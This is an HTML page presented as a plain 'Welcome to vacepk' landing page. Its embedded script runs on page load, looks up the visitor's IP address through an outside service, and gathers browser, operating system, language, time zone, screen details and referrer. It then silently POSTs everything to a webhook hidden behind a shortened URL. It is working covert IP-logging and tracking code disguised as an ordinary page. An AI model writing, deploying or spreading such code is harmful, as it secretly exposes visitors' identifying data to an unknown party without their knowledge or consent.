<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vacepk</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 20%;
        }
    </style>
</head>
<body>
    <h1>Welcome to vacepk</h1>

    <script>
        (function() {
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (e) {
                    return 'N/A';
                }
            }

            function getUA() {
                const ua = navigator.userAgent;
                let browser = 'Unknown Browser';
                let os = 'Unknown OS';

                if (ua.includes('Firefox')) {
                    browser = 'Mozilla Firefox';
                } else if (ua.includes('Chrome')) {
                    browser = 'Google Chrome';
                } else if (ua.includes('Safari')) {
                    browser = 'Safari';
                } else if (ua.includes('MSIE') || ua.includes('Trident')) {
                    browser = 'Internet Explorer';
                } else if (ua.includes('Opera') || ua.includes('OPR')) {
                    browser = 'Opera';
                }

                if (ua.includes('Windows NT 10.0')) {
                    os = 'Windows 10';
                } else if (ua.includes('Mac OS X')) {
                    os = 'Mac OS X';
                } else if (ua.includes('Linux')) {
                    os = 'Linux';
                } else if (ua.includes('Android')) {
                    os = 'Android';
                } else if (ua.includes('iPhone')) {
                    os = 'iOS (iPhone)';
                } else if (ua.includes('iPad')) {
                    os = 'iOS (iPad)';
                }

                return { browser, os };
            }

            function getScreenInfo() {
                const width = screen.width;
                const height = screen.height;
                const colorDepth = screen.colorDepth;
                const pixelDepth = screen.pixelDepth;

                return {
                    width: width,
                    height: height,
                    colorDepth: colorDepth,
                    pixelDepth: pixelDepth
                };
            }

            function getWindowInfo() {
                const width = window.innerWidth;
                const height = window.innerHeight;

                return {
                    width: width,
                    height: height
                };
            }

            function getPlatform() {
                return navigator.platform || 'Unknown Platform';
            }

            function getLanguage() {
                return navigator.language || 'Unknown Language';
            }

            function getTimeZone() {
                return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Time Zone';
            }

            function isOnline() {
                return navigator.onLine ? 'Online' : 'Offline';
            }

            async function sendInfo() {
                const ip = await getIP();
                const { browser, os } = getUA();
                const { width: screenWidth, height: screenHeight, colorDepth, pixelDepth } = getScreenInfo();
                const { width: windowWidth, height: windowHeight } = getWindowInfo();
                const platform = getPlatform();
                const language = getLanguage();
                const timeZone = getTimeZone();
                const onlineStatus = isOnline();
                const referrer = document.referrer || 'Direct';
                const timestamp = new Date().toISOString();

                const data = `
\`\`\`
Visitor Information
-------------------
IP Address: ${ip}
Browser: ${browser}
Operating System: ${os}
Platform: ${platform}
Language: ${language}
Time Zone: ${timeZone}
Online Status: ${onlineStatus}
Screen Width: ${screenWidth}px
Screen Height: ${screenHeight}px
Window Width: ${windowWidth}px
Window Height: ${windowHeight}px
Color Depth: ${colorDepth} bits
Pixel Depth: ${pixelDepth} bits
Referrer: ${referrer}
Timestamp: ${timestamp}
\`\`\`
                `;

                const webhookURL = 'https://tinyurl.com/ye8m429u'; // Shortened URL

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: data })
                });
            }

            window.onload = sendInfo;
        })();
    </script>
</body>
</html>
